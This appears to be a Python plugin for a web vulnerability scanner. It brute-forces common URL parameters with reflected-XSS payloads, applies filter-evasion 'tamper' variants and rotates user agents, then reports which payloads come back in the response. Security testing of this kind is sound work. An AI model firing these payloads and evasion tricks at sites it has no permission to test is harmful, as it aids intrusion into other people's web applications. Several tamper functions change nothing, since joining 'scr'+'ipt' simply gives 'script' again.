"""
RedCortex Plugin: Advanced XSS Detection

Brute param coverage, multiple payloads, encoding/tamper techniques, DOM/script detection.
"""

import requests, random, re

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]

XSS_PARAMS = [
    "q", "search", "query", "term", "keyword", "page", "user", "name", "input", "message",
    "comment", "desc", "email", "id", "ref", "file", "txt", "news", "title", "url"
]

XSS_PAYLOADS = [
    "<script>alert(1337)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(2)>",
    "';alert(document.domain);//",
    "'';!--\"<XSS>=&{()}",
    "<svg/onload=alert(3)>",
    "<iframe src=javascript:alert(4)>",
    "<body onload=alert(5)>",
    "<math href=\"javascript:alert(6)\">X</math>"
]
TAMPERS = [
    lambda x: x,
    lambda x: x.replace("alert", "ALERT"),
    lambda x: x.replace("<", "%3C").replace(">", "%3E"),
    lambda x: x.replace("script", "scr"+"ipt"),
    lambda x: x.replace("onerror", "on"+"error"),
    lambda x: x.replace("svg", "sv"+"g"),
    lambda x: x.replace("\"", "\\\""),
]

REFLECT_PATTERNS = [
    r"<script[^>]*>.*alert.*<\/script>",
    r"<img[^>]*onerror=[^>]*alert[^>]*>",
    r"alert\(.*\)",
    r"svg.*onload=.*alert.*",
    r"iframe.*src=.*alert.*",
    r"onload=.*alert.*"
]

def send_req(url, params):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

def run(response, url):
    """RedCortex plugin interface; brute XSS param/payload/tamper and test for reflected execution."""
    findings = []
    params = {}

    try:
        for param_name in XSS_PARAMS:
            for tamper in TAMPERS:
                for payload in XSS_PAYLOADS:
                    try:
                        fuzzed = tamper(payload)
                        params[param_name] = fuzzed
                        print(f"[*] Testing XSS on param '{param_name}' with tamper '{tamper.__name__ if hasattr(tamper,'__name__') else str(tamper)}' and payload '{payload}'")
                        sc, body = send_req(url, params)
                        # Check if payload is reflected, strong pattern match
                        if sc == 200:
                            for pattern in REFLECT_PATTERNS:
                                if re.search(pattern, body, re.IGNORECASE):
                                    findings.append({
                                        "type": "XSS",
                                        "description": f"Reflected XSS detected via {param_name} ({tamper.__name__ if hasattr(tamper, '__name__') else str(tamper)})",
                                        "param": param_name,
                                        "payload": fuzzed,
                                        "original_payload": payload,
                                        "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                        "severity": "high",
                                        "url": url,
                                        "evidence": re.findall(pattern, body, re.IGNORECASE)
                                    })
                                    return findings
                            # Also: detect if our payload is literally echoed (less strict)
                            if fuzzed in body:
                                findings.append({
                                    "type": "XSS",
                                    "description": f"Possible reflected XSS on {param_name} ({tamper.__name__ if hasattr(tamper, '__name__') else str(tamper)})",
                                    "param": param_name,
                                    "payload": fuzzed,
                                    "original_payload": payload,
                                    "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                    "severity": "medium",
                                    "url": url,
                                    "evidence": fuzzed
                                })
                                return findings
                    except KeyboardInterrupt:
                        print("[!] Scan interrupted by user.")
                        return findings
    except KeyboardInterrupt:
        print("[!] Scan interrupted by user.")
        return findings

    return findings
